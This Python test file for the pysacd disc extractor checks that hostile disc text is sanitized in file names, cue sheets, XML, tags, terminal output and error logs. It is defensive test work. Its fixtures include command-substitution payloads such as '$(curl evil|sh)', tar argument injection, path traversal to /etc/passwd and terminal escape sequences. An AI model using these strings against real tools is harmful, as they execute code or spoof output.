"""Hostile disc text must not become an injection (issue #17).

A crafted disc's title and track titles go through every writer and printer; nothing pysacd
creates or prints may carry control characters, command substitution, a leading '-', a path
outside the output directory, executable permissions or extra cue/XML structure.
"""

import contextlib
import io
import logging
import os
import random
import re
import stat
import sys
import tempfile
import traceback
import unicodedata
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))
import sacdgen

from pysacd import safetext

HOSTILE = [
    "$(touch /tmp/pysacd-pwned)",
    "`id`",
    "--checkpoint-action=exec=sh x",
    "-rf",
    'a\nFILE "evil.wav" WAVE\nb',
    "\x1b]52;c;ZWNobw==\x07clip",
    "x\u202egpj.exe",
    "../../etc/passwd",
    ".bashrc",
    "\u200bzero\u200dwidth",
    "pipe | ; < > redirect",
    "\x9b31mC1 CSI",
]
ALBUM = "$(curl evil|sh) \x1b[31m\n../../x"


def _latin1(t: str) -> bool:
    try:
        t.encode("latin-1")
        return True
    except UnicodeEncodeError:
        return False


# sacdgen writes disc text as ISO-8859-1, like many real discs; bidi and zero-width characters
# reach pysacd through other disc charsets and MusicBrainz and are covered by Functions.
DISC_TITLES = [t for t in HOSTILE if _latin1(t)]
FORBIDDEN = re.compile(f"[\x00-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff"
                       f"{re.escape(safetext.NAME_UNSAFE)}]")


class Functions(unittest.TestCase):
    def test_name_component(self):
        for t in HOSTILE + [ALBUM]:
            n = safetext.name_component(t)
            self.assertFalse(FORBIDDEN.search(n), (t, n))
            self.assertFalse(n.startswith(("-", ".")), (t, n))
            self.assertNotIn("/", n)
            self.assertNotIn(n, ("", ".", ".."))

    def test_ordinary_names_unchanged(self):
        for t in ["Simon & Garfunkel", "Don't Stop", "Nevermind (Remastered) [24-96]", "R.E.M.",
                  "Sigur Rós", "Live!", "AC/DC"]:
            want = t.replace("/", "-")
            self.assertEqual(safetext.name_component(t), want)

    def test_sacd_extract_paths_keep_ordinary_text_byte_identical(self):
        # Real discs carry trailing spaces ("TOMMY ") and whitespace runs; sacd_extract keeps them,
        # so the compatible paths only drop control/bidi/zero-width characters.
        from pysacd import sbcompat
        for t in ["TOMMY ", "Emotional  Rescue", " lead", "Caf\u0065\u0301 decomposed", "Sigur R\u00f3s"]:
            self.assertEqual(sbcompat._b(t), t.encode("utf-8"))
            self.assertEqual(safetext.strip_controls(t), t)
        # a control becomes a space, a format character (here a bidi override) vanishes
        self.assertEqual(sbcompat._b("a\x1bb\u202ec"), b"a bc")

    def test_terminal_and_text(self):
        for t in HOSTILE:
            self.assertFalse(re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e]", safetext.for_terminal(t)), t)
            self.assertFalse(FORBIDDEN.sub("", "") or re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e]",
                                                                safetext.clean_text(t)), t)
        self.assertEqual(safetext.for_terminal("a\x1bb"), "a\\x1bb")
        self.assertEqual(safetext.for_terminal("a\tb\nc", keep_tab_newline=True), "a\tb\nc")


def _native_ok() -> bool:
    try:
        from pysacd import _native
        _native._load()
        return True
    except (ImportError, OSError, RuntimeError):
        return False


@unittest.skipUnless(_native_ok(), "native engine not built")
class HostileDisc(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        frame = bytes([0x69]) * (4704 * 2)          # DSD silence, 2 channels
        frames = [frame] * (10 * len(DISC_TITLES))
        area = sacdgen.AreaSpec(2, frames, [10] * len(DISC_TITLES), dst=False, titles=DISC_TITLES)
        self.iso = self.root / "hostile.iso"
        sacdgen.build_iso(self.iso, [area], title=ALBUM)
        self.out = self.root / "out"
        self.out.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def _check_tree(self):
        files = [p for p in self.out.rglob("*")]
        self.assertTrue(files)
        for p in files:
            rel = p.relative_to(self.out)
            self.assertTrue(p.resolve().is_relative_to(self.out.resolve()), rel)
            for part in rel.parts:
                self.assertFalse(FORBIDDEN.search(part), repr(part))
                self.assertFalse(part.startswith("-"), repr(part))
            if p.is_file():
                self.assertFalse(p.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH), rel)
        return files

    def test_extract_dsf_cue_xml_and_print(self):
        from pysacd import extract
        buf = io.StringIO()
        old = os.getcwd()
        os.chdir(self.out)
        try:
            with contextlib.redirect_stdout(buf):
                rc = extract.main(["-2", "-s", "-C", "-P", "-i", str(self.iso), "--no-cfg"])
        finally:
            os.chdir(old)
        self.assertEqual(rc, 0)
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", buf.getvalue()))
        files = self._check_tree()
        for cue in [p for p in files if p.suffix == ".cue"]:
            text = cue.read_bytes().decode("utf-8", "replace").lstrip("\ufeff")   # sacd_extract writes a BOM
            for line in filter(str.strip, text.splitlines()):
                self.assertRegex(line.strip(), r'^(REM|PERFORMER|TITLE|CATALOG|FILE|TRACK|INDEX|ISRC|SONGWRITER|FLAGS)\b',
                                 line)
            self.assertEqual(sum(1 for line in cue.read_text(errors="replace").splitlines()
                                 if line.startswith("FILE ")), 1)
        for x in [p for p in files if p.suffix == ".xml"]:
            ET.parse(x)                                 # well-formed, no injected markup
            self.assertFalse(re.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", x.read_text(errors="replace")))

    def test_collision_warnings_are_escaped(self):
        # #16: a second, different disc rendering into the same directory gets a warning that
        # quotes disc text; it must be escaped too.
        from pysacd.convert import Options, convert
        fr = bytes([0x69]) * (4704 * 2)
        isos = []
        for i, cat in enumerate(["CAT\x1b]0;x\x07-1", "CAT-2"]):
            iso = self.root / f"d{i}.iso"
            info = sacdgen.DiscInfo(title=ALBUM, disc_catalog=cat)
            sacdgen.build_iso(iso, [sacdgen.AreaSpec(2, [fr] * 20, [10, 10], dst=False,
                                                     titles=DISC_TITLES[:2])], info=info)
            isos.append(iso)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            for iso in isos:
                convert(str(iso), Options(output_dir=str(self.out), musicbrainz=False, cover=False, format="dsf"))
        self.assertIn("warning", err.getvalue().lower())
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", err.getvalue()))
        self._check_tree()

    def test_convert_names_and_tags(self):
        from pysacd.convert import Options, convert
        opts = Options(output_dir=str(self.out), musicbrainz=False, cover=False, format="dsf")
        err = io.StringIO()
        with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(convert(str(self.iso), opts), 0)
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", err.getvalue()))
        files = self._check_tree()
        try:
            from mutagen.dsf import DSF
        except ImportError:
            return
        for p in [f for f in files if f.suffix == ".dsf"]:
            tags = DSF(p).tags
            for frame in tags.values():
                for v in getattr(frame, "text", []):
                    self.assertFalse(re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e\u200b-\u200f]", str(v)), (p, v))


class HostileMusicBrainz(unittest.TestCase):
    def test_isrc_plan_output(self):
        # MusicBrainz titles and formats are shown before ISRCs are submitted (#34)
        import types
        from unittest import mock

        from pysacd import isrcsubmit, musicbrainz
        rid = "00000000-0000-4000-8000-000000000000"
        medium = {"format": "SACD\x1b[2J\u202e", "tracks": [{"title": "t\x1b]52;c;AAAA\x07\nFAKE", "recording": {"id": rid}}]}
        m = musicbrainz.Match({"id": rid}, medium, 0.0, 0, "barcode")
        out: list[str] = []
        area = types.SimpleNamespace(tracks=[types.SimpleNamespace(isrc="GBAAA0400001")])
        with mock.patch.object(isrcsubmit, "_isrc_recordings", return_value=[]):
            isrcsubmit.offer(m, area, None, dry_run=True, out=out.append)
        self.assertFalse(re.search(r"[\x00-\x08\x0a-\x1f\x7f-\x9f\u202a-\u202e]", "".join(out)))

# ---------------------------------------------------------------- #47 part A

INVISIBLE = safetext.INVISIBLE_CATEGORIES


def _invisible_in(s: str, keep: str = "") -> list[str]:
    return [c for c in s if c not in keep and unicodedata.category(c) in INVISIBLE]

CATEGORY_CASES = {
    "line separator": "a\u2028b",
    "paragraph separator": "a\u2029b",
    "tag characters": "ok\U000e0049\U000e0047\U000e004e\U000e004f\U000e0052\U000e0045",
    "BOM": "\ufeffstart",
    "soft hyphen": "soft\xadhyphen",
    "noncharacters": "x\ufffe\uffff\ufdd0y",
    "private use": "x\ue000\U000f0000\U0010fffdy",
    "unassigned": "x\U000e0080\U0003fffey",
    "bidi": "x\u202egpj.exe",
    "zero width": "\u200bzero\u200dwidth\u2060",
    "C1": "x\x85\x9by",
}


class Categories(unittest.TestCase):
    """Characters are judged by Unicode category (#47)."""


    def test_removed_everywhere(self):
        for label, t in CATEGORY_CASES.items():
            for f in (safetext.clean_text, safetext.name_component, safetext.strip_controls):
                self.assertEqual(_invisible_in(f(t)), [], (label, f.__name__))

    def test_separators_keep_words_apart(self):
        self.assertEqual(safetext.clean_text("a\u2028b"), "a b")
        self.assertEqual(safetext.clean_text("a\nb"), "a b")
        self.assertEqual(safetext.clean_text("soft\xadhyphen"), "softhyphen")
        self.assertEqual(safetext.clean_text("\u200bzero\u200dwidth"), "zerowidth")

    def test_spaces_become_plain_spaces_in_names_and_tags(self):
        t = "a\xa0b\u3000c\u2009d\u202fe"
        self.assertEqual(safetext.clean_text(t), "a b c d e")
        self.assertEqual(safetext.name_component(t), "a b c d e")

    def test_compatible_paths_keep_spaces_and_surrogates(self):
        # sacd_extract keeps U+3000 (common on Japanese discs) and NBSP; a name cut inside a
        # multi-byte character carries the raw bytes as lone surrogates (sbcompat.py).
        for t in ["a\xa0b\u3000c", "cut\udcc3", "\u5c71\u4e0b\u3000\u9054\u90ce"]:
            self.assertEqual(safetext.strip_controls(t), t)

    def test_nfc_after_removal(self):
        # removing the zero-width space leaves e + combining acute, which NFC composes
        self.assertEqual(safetext.clean_text("e\u200b\u0301"), "\u00e9")


class Terminal(unittest.TestCase):
    """for_terminal() makes every invisible character visible, including bidi and zero-width
    characters, so output can't be visually spoofed (Trojan Source, #47)."""

    def test_escapes(self):
        cases = {"\u202e": "\\u202e", "\u2066": "\\u2066", "\u200b": "\\u200b", "\ufeff": "\\ufeff",
                 "\u2028": "\\u2028", "\U000e0041": "\\U000e0041", "\xad": "\\xad", "\x1b": "\\x1b",
                 "\udcc3": "\\udcc3"}
        for c, want in cases.items():
            self.assertEqual(safetext.for_terminal(f"a{c}b"), f"a{want}b")

    def test_visible_text_unchanged(self):
        for t in ["Sigur Rós", "\u5c71\u4e0b \u9054\u90ce", "a\xa0b", "Ke$ha", "tab\there"]:
            want = t.replace("\t", "\\x09")
            self.assertEqual(safetext.for_terminal(t), want)
        self.assertEqual(safetext.for_terminal("tab\there\n", keep_tab_newline=True), "tab\there\n")


class ErrorPaths(unittest.TestCase):
    """Failures quote paths and exception messages, which can carry hostile names (#47)."""

    HOSTILE = "out\x1b]0;pwned\x07\u202e\n[FAKE] ok"

    def _clean(self, text: str) -> None:
        self.assertEqual(_invisible_in(text, keep="\n"), [], repr(text))
        self.assertNotIn("\n[FAKE]", text)

    @unittest.skipIf(os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0),
                     "needs POSIX permissions and a non-root user")
    def test_write_failure_on_a_hostile_name(self):
        from pysacd import extract
        with tempfile.TemporaryDirectory() as tmp:
            iso = Path(tmp) / "in.iso"
            fr = bytes([0x69]) * (4704 * 2)
            sacdgen.build_iso(iso, [sacdgen.AreaSpec(2, [fr] * 4, [2, 2], dst=False)])
            out = Path(tmp) / self.HOSTILE
            out.mkdir()
            out.chmod(0o500)        # creating the album folder fails
            err = io.StringIO()
            try:
                with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                    rc = extract.main(["-s", "--no-cfg", "-o", str(out), "-i", str(iso)])
            finally:
                out.chmod(0o700)
        self.assertEqual(rc, 255)
        self.assertIn("ERROR", err.getvalue())
        self.assertIn("\\x1b", err.getvalue())
        self._clean(err.getvalue())

    def test_unreadable_input_with_a_hostile_name(self):
        from pysacd import extract
        with tempfile.TemporaryDirectory() as tmp:
            bad = Path(tmp) / ("x\u202e" if os.name == "nt" else "x\x1b[31m\u202e")
            bad.write_bytes(b"not a disc")
            err = io.StringIO()
            with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(extract.main(["-P", "--no-cfg", "-i", str(bad)]), 255)
        self._clean(err.getvalue())

    def _raise(self):
        try:
            raise ValueError("inner " + self.HOSTILE)
        except ValueError as e:
            raise OSError(13, "Permission denied", self.HOSTILE) from e

    def test_format_exception(self):
        try:
            self._raise()
        except OSError as e:
            exc = e
        text = safetext.format_exception(exc)
        self.assertIn("Traceback (most recent call last):", text)
        self.assertIn("direct cause", text)
        self.assertIn("_raise", text)                     # the stack is kept
        self._clean(text)
        self.assertIn("\n[FAKE]", "".join(traceback.format_exception(exc)))     # Python's own: forged

    def test_excepthook(self):
        old = sys.excepthook
        safetext.install_excepthook()
        try:
            self.assertIs(sys.excepthook, safetext._excepthook)
            err = io.StringIO()
            try:
                self._raise()
            except OSError as e:
                with contextlib.redirect_stderr(err):
                    sys.excepthook(type(e), e, e.__traceback__)
        finally:
            sys.excepthook = old
        self.assertIn("PermissionError", err.getvalue())
        self._clean(err.getvalue())

    def test_log_file_tracebacks(self):
        from pysacd import log as pslog
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "pysacd.log"
            pslog.setup("debug", path)
            try:
                try:
                    self._raise()
                except OSError:
                    logging.getLogger("pysacd.test").exception("failed on %s", self.HOSTILE)
            finally:
                pslog.setup("error")
            text = path.read_text(encoding="utf-8")
        self.assertIn("Traceback", text)
        self._clean(text)


# Code points from every category, weighted towards the awkward ones
_POOLS = [
    (0x20, 0x7e), (0x00, 0x1f), (0x7f, 0x9f), (0xa0, 0xff), (0x200b, 0x200f), (0x2028, 0x202e),
    (0x2060, 0x206f), (0xfeff, 0xfeff), (0xfff9, 0xffff), (0xfdd0, 0xfdef), (0xe000, 0xf8ff),
    (0xd800, 0xdfff), (0xe0000, 0xe007f), (0x0300, 0x036f), (0x3000, 0x3000), (0x2000, 0x200a),
    (0x0100, 0xffff), (0x10000, 0x10ffff),
]
_SPECIAL = list("/\\-. `$|;<>&\"'\t\n\r") + ["..", "--", "-rf"]


def _random_text(rng: random.Random, surrogates: bool = True) -> str:
    out = []
    for _ in range(rng.randrange(0, 40)):
        if rng.random() < 0.2:
            out.append(rng.choice(_SPECIAL))
            continue
        lo, hi = rng.choice(_POOLS)
        c = chr(rng.randint(lo, hi))
        if not surrogates and unicodedata.category(c) == "Cs":
            c = "?"
        out.append(c)
    return "".join(out)


class Properties(unittest.TestCase):
    """Seeded property tests over random text from every Unicode category (#47).
    PYSACD_FUZZ=N runs N cases."""

    N = int(os.environ.get("PYSACD_FUZZ", "2000"))

    def cases(self, seed: int, surrogates: bool = True):
        rng = random.Random(seed)
        for i in range(self.N):
            yield i, _random_text(rng, surrogates)

    def test_idempotent(self):
        for f in (safetext.clean_text, safetext.name_component, safetext.strip_controls, safetext.for_terminal):
            for i, t in self.cases(1):
                once = f(t)
                self.assertEqual(f(once), once, (f.__name__, i, t))

    def test_name_invariants(self):
        for i, t in self.cases(2):
            n = safetext.name_component(t)
            ctx = (i, t, n)
            self.assertTrue(n, ctx)
            self.assertNotIn(n, (".", ".."), ctx)
            self.assertFalse(n.startswith(("-", ".")), ctx)
            self.assertFalse(set(n) & set(safetext.NAME_UNSAFE + "/\\"), ctx)
            self.assertEqual(_invisible_in(n), [], ctx)
            self.assertFalse([c for c in n if unicodedata.category(c) == "Zs" and c != " "], ctx)
            self.assertEqual(n, unicodedata.normalize("NFC", n), ctx)
            n.encode("utf-8")                                   # valid UTF-8: no lone surrogates

    def test_text_and_terminal_invariants(self):
        for i, t in self.cases(3):
            c = safetext.clean_text(t)
            self.assertEqual(_invisible_in(c), [], (i, t))
            self.assertEqual(c, c.strip(), (i, t))
            c.encode("utf-8")
            for keep in (False, True):
                v = safetext.for_terminal(t, keep_tab_newline=keep)
                self.assertEqual(_invisible_in(v, keep="\t\n" if keep else ""), [], (i, t, keep))
                v.encode("utf-8")
            self.assertEqual(safetext.has_unsafe_name_chars(t),
                             safetext.name_component(t) != safetext.name_component(t.strip()) or
                             bool(_invisible_in(t)) or bool(set(t) & set(safetext.NAME_UNSAFE))
                             or t.lstrip().startswith("-"), (i, t))

    def _disc(self):
        from pysacd.toc import read_toc
        with tempfile.TemporaryDirectory() as tmp:
            iso = Path(tmp) / "d.iso"
            fr = bytes([0x69]) * (4704 * 2)
            sacdgen.build_iso(iso, [sacdgen.AreaSpec(2, [fr] * 6, [2, 2, 2], dst=False)])
            return read_toc(str(iso))

    def test_cue_structure(self):
        from pysacd import sbcompat
        disc = self._disc()
        area = disc.stereo
        assert area is not None
        directive = re.compile(r'^(REM .*|PERFORMER ".*"|TITLE ".*"|CATALOG ".*"|FILE ".*" WAVE|'
                               r'  TRACK \d\d AUDIO|      (TITLE|PERFORMER) ".*"|      ISRC \S*|'
                               r'      INDEX 0[01] \d\d:\d\d:\d\d)$')
        rng = random.Random(4)
        for i in range(self.N // 10):
            disc.text["disc_title"] = _random_text(rng, surrogates=False)
            for t in area.tracks:
                t.text = {"title": _random_text(rng, surrogates=False), "performer": _random_text(rng, False)}
            cue = sbcompat.cue_sheet(disc, area, "album.dff").decode("utf-8", "surrogateescape")
            lines = cue.lstrip("\ufeff").split("\n")
            self.assertEqual(lines[0], "", i)
            self.assertEqual(lines[-1], "", i)
            for line in lines[1:-1]:
                self.assertRegex(line, directive, (i, line))
                self.assertEqual(_invisible_in(line), [], (i, line))
            self.assertEqual(sum(line.startswith("  TRACK ") for line in lines), len(area.tracks), i)

    def test_xml_round_trip(self):
        from pysacd import sbcompat
        disc = self._disc()
        area = disc.stereo
        assert area is not None
        rng = random.Random(5)
        for i in range(self.N // 10):
            album = _random_text(rng, surrogates=False)
            titles = [_random_text(rng, surrogates=False) for _ in area.tracks]
            disc.text["album_title"] = album
            for t, title in zip(area.tracks, titles):
                t.text = {"title": title}
            root = ET.fromstring(sbcompat.metadata_xml(disc))
            self.assertEqual(root.find("Album/Title").text or "",
                             safetext.strip_controls(album, keep_tab_newline=True).replace("\r", "\n"), i)
            got = [m.get("value") for m in root.iter("meta") if m.get("name") == "TITLE"]
            self.assertEqual(got, [safetext.strip_controls(t, keep_tab_newline=True) for t in titles], i)


if __name__ == "__main__":
    unittest.main()
